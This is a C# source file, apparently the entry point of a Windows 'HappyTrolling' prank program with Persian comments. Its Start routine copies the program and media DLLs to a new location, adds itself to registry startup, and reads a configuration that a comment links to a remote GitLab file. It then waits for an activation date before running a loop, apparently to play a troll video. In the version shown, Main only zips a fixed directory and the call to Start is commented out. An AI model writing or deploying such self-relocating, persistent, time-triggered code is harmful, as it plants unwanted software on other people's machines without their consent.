using System;
using BoneFier;
using BoneFier.Basic;
using System.IO;
using System.Threading;
using Script;
using System.Diagnostics;
using System.Reflection;

namespace BoneFier
{
    internal class Program
    {
        //cloud data = https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt
        //Video name : TROLLshowvid.mp4

        public static Application application = new Application();
        public static Emigrator emigrator = new Emigrator();
        public static Asset asset = new Asset(emigrator.EmigrationPath + @"\BFasset\");

        [STAThread]
        static void Main(string[] args)
        {
            string Direct = (@"D:\MYDIR");
            Kernel.ZipDirectory(Direct,@"D:\MYZIPDIR");

            //System.Windows.Forms.Application.EnableVisualStyles();
            //System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
            //Start();
        }
        static void Start()
        {
            //بروز رسانی پیکربندی نرم افزار
            application.UpdateAppConfig();

            if (!emigrator.IsEmegrated(emigrator.TargetPath))
            {
                //کپی کرردن ویدیو
                Kernel.CopyFile(HappyTrolling.VideoName, asset.AssetDirectory); 
                //کپی کردن دی ال ال های لازم 
                Kernel.CopyFile(@"AxInterop.WMPLib.dll",emigrator.EmigrationPath);
                Kernel.CopyFile(@"Interop.WMPLib.dll", emigrator.EmigrationPath);
            }
            //مهاجرت نرم افزار
            emigrator.Emigrate(); //در شروع اولیه برنامه اینجا بعد از مهاجرت خارج میشه
            //بروز رسانی پیکربندی نرم افزار
            application.UpdateAppConfig();
            //استارت اپ
            Debuger.Log("Checking rigestry.");
            Kernel.SetStartUp(emigrator.ApplicationName, emigrator.TargetPath);
            //برسی تاریخ فعال سازی
            if (Calendarmanager.CheckActivationDay(application.ApplicationConfig.Activationdate.ToDateTime()))
            {
                //فعال سازی
                RunTimeLoop.StartLoop(application.ApplicationConfig.LoopFrec); 
            }
            else
            {
                //خروج از برنامه در صورت نبود روز
                Debuger.Log("Not activation day. Exiting.");
                Application.Exit();//خروج اگر اون روز نیست
            }
        }
    }
}
